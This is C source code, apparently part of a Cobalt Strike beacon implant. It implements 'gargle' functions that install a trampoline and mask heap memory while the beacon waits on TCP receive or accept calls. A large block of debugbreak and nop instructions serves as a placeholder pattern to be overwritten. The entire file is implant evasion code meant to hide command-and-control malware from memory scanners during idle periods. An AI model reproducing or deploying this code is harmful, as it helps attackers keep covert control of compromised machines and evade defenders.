/* gargle! */
#include <WinSock2.h>
#include <windows.h>
#include <intrin.h>
#include "beacon.h"
#include "gargleint.h"

#define GARGLE_TCP_ACTION_RECV   0
#define GARGLE_TCP_ACTION_ACCEPT 1

typedef struct {
	int    action;
	SOCKET in;
	SOCKET out;
	SOCKET (__stdcall *accept)(SOCKET, struct sockaddr *, int *);
	void   (__stdcall *recv)(SOCKET, void *, int, int);
} GARGLE_TCP_ARGS;

typedef void(*GARGLEF)(GARGLEP * parms, GARGLE_TCP_ARGS * args);

/* this is the stub function we copy over */
/* For CS 4.4 the pattern size is 268 */
/* For CS 4.5 the pattern size is 768 */
static void _gargle_it(GARGLEP * parms, GARGLE_TCP_ARGS * args) {
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();
	__debugbreak(); __nop(); __nop(); __nop(); __debugbreak(); __nop(); __nop(); __nop();

}

static void setup_trampoline2() {
	gargle_trampoline(setup_trampoline2, _gargle_it);
}

void GargleWaitTCP(SOCKET s) {
	GARGLE_TCP_ARGS args;
	GARGLEF         func;
	DWORD           start = GetTickCount();

	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0) {
		return;
	}
	else {
		/* create our trampoline, please */
		setup_trampoline2();

		/* setup our arguments */
		args.action = GARGLE_TCP_ACTION_RECV;
		args.in     = s;
		args.recv   = (void(__stdcall*)(SOCKET, void*, int, int))recv;

		/* get the heap sections to mask. */
		gparms->heap_records = track_memory_get_heap_records_to_mask();

		/* call our function */
		func = (GARGLEF)gtrampoline;
		func(gparms, &args);
	}
}

SOCKET GargleAccept(SOCKET s) {
	GARGLE_TCP_ARGS args;
	GARGLEF         func;

	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0) {
		return accept(s, NULL, 0);
	}
	else {
		/* create our trampoline, please */
		setup_trampoline2();

		/* setup our arguments */
		args.action = GARGLE_TCP_ACTION_ACCEPT;
		args.in     = s;
		args.accept = accept;

		/* get the heap sections to mask. */
		gparms->heap_records = track_memory_get_heap_records_to_mask();

		/* call our function */
		func = (GARGLEF)gtrampoline;
		func(gparms, &args);

		/* return the out value from our struct */
		return args.out;
	}
}